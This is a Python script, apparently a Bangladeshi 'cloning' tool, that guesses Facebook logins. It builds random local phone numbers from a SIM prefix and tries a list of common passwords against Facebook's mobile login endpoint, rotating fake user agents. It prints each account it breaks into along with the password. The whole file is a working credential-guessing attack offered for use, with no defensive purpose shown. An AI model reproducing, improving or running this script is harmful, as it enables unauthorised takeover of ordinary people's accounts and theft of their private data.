import os, time, sys, uuid, random, requests

# প্রফেশনাল ইউজার এজেন্ট পুল
def get_ua():
    android_version = random.randint(10, 14)
    models = ['SM-S918B', 'SM-A546B', 'Pixel 8 Pro', 'iPhone 15,3', 'SM-G998B']
    model = random.choice(models)
    return f"Mozilla/5.0 (Linux; Android {android_version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"

def banner():
    os.system('clear')
    print(f"""\033[1;32m
     ███    ███  ███████  ████████  █████  
     ████  ████  ██          ██    ██   ██ 
     ██ ████ ██  █████       ██    ███████ 
     ██  ██  ██  ██          ██    ██   ██ 
     ██      ██  ███████     ██    ██   ██ 
\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;32m [✓] CREATED BY : MD MALEK ISLAM (META REAL)
 [✓] METHOD     : CYBER BYPASS LOGIC (v3.0)
\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××""")

def cloning():
    banner()
    code = input('\033[1;32m[+] SIM CODE (018, 019, 017, 013): \033[1;37m')
    limit = int(input('\033[1;32m[+] LIMIT: \033[1;37m'))
    
    banner()
    print('\033[1;32m[+] TARGET: HIGH-SPEED BYPASS')
    print('[+] STATUS: RUNNING DEEP SCAN')
    print('\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××\n')
    
    ok, cp, loop = 0, 0, 0
    
    for _ in range(limit):
        loop += 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        
        # স্মার্ট পাসওয়ার্ড লজিক (সবচেয়ে বেশি কার্যকরগুলো আগে)
        pws = [uid, uid[4:], uid[5:], '786786', 'bangladesh', 'Bangladesh', 'i love you', 'I love you', '@@@###', '10203040', '55667788']
        
        for pw in pws:
            if len(pw) < 6: continue 
            
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/',
                'user-agent': get_ua(), # ডাইনামিক ইউএ
            }

            data = {'lsd': uuid.uuid4().hex, 'jazoest': '2'+str(random.randint(1000, 9999)), 'email': uid, 'pass': pw}
            
            sys.stdout.write(f'\r\033[1;32m[MALEK-BYPASS] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()

            try:
                res = requests.post("https://m.facebook.com/login/device-based/regular/login/", headers=headers, data=data, allow_redirects=False, timeout=15)
                if "c_user" in res.cookies.get_dict():
                    ok += 1
                    print(f'\n\033[1;32m[OK💚] {uid} | {pw}')
                    break 
                elif "checkpoint" in res.cookies.get_dict():
                    cp += 1
                    break
            except: time.sleep(1)

if __name__ == "__main__": cloning()
